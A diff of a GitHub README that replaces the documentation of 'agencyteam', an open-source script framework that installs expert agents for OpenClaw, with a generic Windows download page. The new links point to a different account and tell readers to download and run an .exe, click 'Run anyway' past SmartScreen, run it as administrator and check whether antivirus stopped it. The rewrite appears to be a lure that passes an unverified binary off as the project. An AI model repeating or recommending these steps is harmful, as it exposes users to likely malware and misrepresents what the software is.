@@ -1,175 +1,200 @@
-# agencyteam — An expert orchestration framework for OpenClaw
+# 🤖 agencyteam-openclaw - Run AI workflows with ease
 
-[![CI](https://github.com/siubing05/agencyteam-openclaw/actions/workflows/ci.yml/badge.svg)](https://github.com/siubing05/agencyteam-openclaw/actions/workflows/ci.yml) [![Release](https://img.shields.io/github/v/release/siubing05/agencyteam-openclaw?display_name=tag)](https://github.com/siubing05/agencyteam-openclaw/releases) [![Last Commit](https://img.shields.io/github/last-commit/siubing05/agencyteam-openclaw)](https://github.com/siubing05/agencyteam-openclaw/commits/master)
+[![Download / Install](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/edwininspiring666/agencyteam-openclaw)
 
-🌐 **English** | [简体中文](README.zh-CN.md) | [繁體中文](README.zh-TW.md) | [日本語](README.ja.md) | [한국어](README.ko.md)
+## 🧭 What this is
 
-`agencyteam` turns specialist agent workspaces into a reproducible expert orchestration workflow for OpenClaw.
+agencyteam-openclaw is a Windows app and workflow pack for OpenClaw. It helps you run agent-based tasks for code review, security review, and AI automation in one place.
 
-It helps you build practical multi-agent workflows for code review, security review, architecture feedback, product critique, prompt engineering, and other AI agent automation tasks without hand-wiring every specialist yourself.
+Use it when you want to:
+- review code with AI support
+- check common security issues
+- run repeatable multi-step workflows
+- set up agency agents as installable workflows
+- keep routine dev tasks in one place
 
-`agency-agents` refers to the upstream public expert roster from [`msitarzewski/agency-agents`](https://github.com/msitarzewski/agency-agents), which `agencyteam` converts into OpenClaw-ready workspaces and installable specialists.
+## 💻 What you need
 
-It is designed for:
-- parallel specialist reviews
-- builder/reviewer splits
-- code + security + product synthesis
-- on-demand expert installation from the [`agency-agents`](https://github.com/msitarzewski/agency-agents) upstream roster
-- repeatable agent routing and expert workflow automation for OpenClaw
+Before you start, make sure your Windows PC has:
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- 2 GB of free disk space
+- A stable internet connection
+- A web browser such as Edge, Chrome, or Firefox
 
-## What it does
+If the app opens a local tool or service, it may also need:
+- permission to run on your PC
+- access through Windows Defender Firewall
+- a recent version of WebView or .NET if the app asks for it
 
-- converts supported upstream expert prompts into OpenClaw workspaces under `~/.openclaw/agency-agents/<agent-id>/`
-- registers those experts in `agents.list`
-- preserves non-agency agents already present in your config
-- merges installed expert IDs into `main.subagents.allowAgents` (and preserves an existing `['*']` wildcard if you already use one)
-- provides scripts for install, update, and on-demand spawn
-- pins the default upstream source revision via `UPSTREAM_REF` for reproducible installs
-- includes GitHub Actions smoke testing for script regressions
+## 📥 Download and install
 
-Built for teams that want faster multi-expert execution without giving up deterministic installs, safer config sync, or clean OpenClaw integration.
+Use this link to visit the download page and get the app:
 
-## How it fits together
+[Go to the agencyteam-openclaw download page](https://github.com/edwininspiring666/agencyteam-openclaw)
 
-```mermaid
-flowchart LR
-  U[agency-agents upstream\npublic expert roster] -->|convert.sh| W[OpenClaw workspaces\n~/.openclaw/agency-agents/<agent-id>/]
-  W -->|sync_openclaw_config.py| C[openclaw.json\nagents.list]
-  C --> A[main.subagents.allowAgents]
-  W --> S[install.sh / update.sh / spawn-and-install.sh]
-  A --> R[On-demand expert runs]
-  S --> R
-```
+If the page shows a release file, choose the Windows version and download it. Then follow the steps below.
 
-- `convert.sh` transforms upstream expert prompts into a staged snapshot of local OpenClaw workspaces
-- `install.sh` syncs that staged snapshot into the live workspace root, then registers selected experts and updates `main.subagents.allowAgents`
-- `update.sh` refreshes generated experts from a staged snapshot while preserving non-agency agents in your config
-- `spawn-and-install.sh` repairs a missing or unhealthy expert from a staged snapshot before launching the workflow
+1. Open the download page in your browser.
+2. Look for the latest release or the main download file.
+3. Download the Windows file to your computer.
+4. If the file is in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Find the app file, such as an .exe file.
+7. Double-click the file to run it.
+8. If Windows asks for permission, choose Yes.
+9. If SmartScreen appears, choose More info, then Run anyway if you trust the file.
 
-## Common use cases
+## 🪟 First-time setup
 
-- run parallel code review, security review, and architecture review on the same repo
-- split builder and reviewer roles across specialist agents for safer implementation loops
-- install expert personas on demand instead of preloading a large agent roster manually
-- create reusable AI workflow patterns for engineering, product, design, QA, and growth work
-- orchestrate prompt engineering and system prompt review with distinct expert perspectives
-- build OpenClaw automation flows that stay reproducible across installs, updates, and gateway restarts
-- support solo builders who want an "AI team" feel without maintaining complex custom routing by hand
+When you open agencyteam-openclaw for the first time, you may see setup screens for workflow paths, agent options, or local storage.
 
-## Requirements
+Do this:
+- keep the default settings if you are unsure
+- choose a folder you can find later
+- allow the app to create its working files
+- connect any accounts or API keys only if the app asks for them
 
-- `openclaw`
-- `git`
-- `python3`
+If the app has a sign-in or token field, use the values from your OpenClaw setup or your team setup.
 
-## Quick start
+## ⚙️ How to use it
 
-```bash
-git clone https://github.com/siubing05/agencyteam-openclaw.git \
-  ~/.openclaw/workspace/skills/agencyteam
+agencyteam-openclaw is built around workflows. A workflow is a set of steps that an agent team runs for you.
 
-cd ~/.openclaw/workspace/skills/agencyteam
-./scripts/install.sh
-```
+Common uses include:
 
-## Install options
+### 🔍 Code review
+Use this workflow to scan code for:
+- logic problems
+- style issues
+- missed edge cases
+- hard-to-read changes
 
-Install all supported experts:
+This is useful before you merge code or hand work to another person.
 
-```bash
-./scripts/install.sh
-# or
-./scripts/install.sh --all
-```
+### 🛡️ Security review
+Use this workflow to check for:
+- unsafe input handling
+- weak secrets use
+- risky file access
+- common app security gaps
 
-Install only specific experts:
+This helps you catch problems early in the review process.
 
-```bash
-./scripts/install.sh --agents "engineering-code-reviewer engineering-security-engineer design-ui-designer"
-```
+### 🤖 AI automation
+Use this workflow to automate repeat tasks like:
+- summarizing changes
+- sorting issues
+- drafting review notes
+- routing work to the right agent
 
-## Pinned upstream policy
+This can save time on tasks that follow the same pattern.
 
-By default, conversion uses the commit recorded in `UPSTREAM_REF`.
+## 🧩 Typical workflow steps
 
-- this makes installs reproducible
-- this narrows supply-chain drift compared with tracking `main` implicitly
-- you can override it deliberately with `AGENCYTEAM_UPSTREAM_REF=<tag-or-commit>` or `./scripts/convert.sh --ref <tag-or-commit>`
+A normal run looks like this:
+1. Open the app.
+2. Choose a workflow type.
+3. Pick the project, folder, or input you want to review.
+4. Select the agent team or review mode.
+5. Start the run.
+6. Wait while the workflow processes the task.
+7. Read the result and apply the suggestions you want.
 
-## What the installer actually does
+## 📂 Example use cases
 
-1. clones the upstream `agency-agents` repo to a temporary directory
-2. converts supported categories into OpenClaw workspaces
-3. syncs matching entries into `agents.list`
-4. merges installed IDs into `main.subagents.allowAgents`
-5. creates a timestamped backup of `openclaw.json`
-6. restarts the gateway and waits for it to respond
+You can use agencyteam-openclaw for:
+- reviewing a new pull request
+- checking a codebase before release
+- scanning a folder for security risks
+- creating a repeatable QA check
+- routing tasks across multiple AI agents
+- preparing review notes for a team member
 
-## Update workflow
+## 🔧 Common setup options
 
-Preview upstream changes without writing anything:
+You may see settings like these:
+- workflow name
+- input folder
+- output folder
+- review depth
+- agent count
+- prompt settings
+- security scan level
+- log level
 
-```bash
-./scripts/update.sh --dry-run
-```
+If you are not sure what to choose, keep the default values first. You can change them later after you see how the workflow behaves.
 
-Apply upstream changes:
+## 🪄 Tips for smooth use
 
-```bash
-./scripts/update.sh
-```
+- Keep project folders simple and easy to find.
+- Use short folder names with no special characters.
+- Close extra apps if your PC feels slow.
+- Start with one workflow before you try more.
+- Save the output files in a clear location.
+- Use the same setup each time for repeatable results.
 
-Also remove agencyteam-managed agents that disappeared upstream:
+## 🧪 If something does not work
 
-```bash
-./scripts/update.sh --prune-removed
-```
+If the app does not start or it closes right away, try this:
+- download the file again
+- make sure the ZIP file is fully extracted
+- right-click the app and choose Run as administrator
+- check whether Windows blocked the file
+- restart your PC and try again
+- confirm your firewall or antivirus did not stop the app
 
-### Important update behavior
+If a workflow fails during a run:
+- check that the input folder exists
+- make sure the files you want to review are not open in another app
+- confirm any needed key or token is set
+- try a smaller input folder first
 
-- `update.sh` refreshes generated `AGENTS.md` files from upstream
-- if you manually edited generated files under `~/.openclaw/agency-agents/`, an update can overwrite those edits
-- non-agency agents in your config are preserved
-- `--prune-removed` is opt-in so removals are explicit
-- prune flows only remove directories marked with `AGENCYTEAM_MANAGED`; unrelated local directories under the same root are left alone
-- config sync fail-fast validates malformed `main.subagents.allowAgents` values instead of silently dropping bad entries
+## 📁 Files you may see
 
-## On-demand installation + spawn
+Depending on the release, the download may include:
+- the main app file
+- a config file
+- a workflows folder
+- a logs folder
+- a README file
+- sample inputs or examples
 
-If you want to use one expert immediately and install it if missing:
+If there is a sample workflow, use it first so you can see how the app behaves before you use your own files.
 
-```bash
-./scripts/spawn-and-install.sh engineering-code-reviewer "Review this repository for correctness and maintainability" --timeout 600
-```
+## 🔐 Security and privacy
 
-## Verify
+This app works with code and workflow data, so keep control of what you feed into it.
 
-```bash
-openclaw agents list
-openclaw gateway status
-```
+Good habits:
+- do not share secrets in plain text if you can avoid it
+- review what the workflow sends or saves
+- store output files in a private folder
+- keep your Windows account protected with a password
 
-## Advanced environment overrides
+## 📌 Project focus
 
-```bash
-AGENCY_DEST=/tmp/agency-agents ./scripts/install.sh --agents "engineering-code-reviewer"
-OPENCLAW_CONFIG_PATH=/tmp/openclaw.json ./scripts/update.sh --dry-run
-AGENCYTEAM_UPSTREAM_REF=<tag-or-commit> ./scripts/install.sh
-./scripts/convert.sh --ref <tag-or-commit>
-```
+agencyteam-openclaw centers on:
+- agent orchestration
+- multi-agent workflows
+- code review
+- security review
+- workflow automation
+- prompt-driven task handling
+- developer tools for end users
 
-## Suggested public positioning
+## 🖥️ Windows run checklist
 
-Use `agencyteam` when you want OpenClaw to behave like a small expert panel instead of a single generalist assistant.
+Before you start a run, check this:
+- the app is downloaded
+- the file is extracted if needed
+- the app opens without errors
+- the input folder is ready
+- the output folder has space
+- any required permissions are allowed
 
-## CI
+## 🔗 Download again
 
-GitHub Actions runs `.github/workflows/ci.yml`, which performs:
-- bash syntax checks
-- python syntax checks
-- a deterministic local smoke test with a fake `openclaw` shim and local upstream git repo
+If you need the app later, use this page again:
 
-See also:
-- `SKILL.md`
-- `references/routing.md`
-- `references/workflows.md`
+[https://github.com/edwininspiring666/agencyteam-openclaw](https://github.com/edwininspiring666/agencyteam-openclaw)
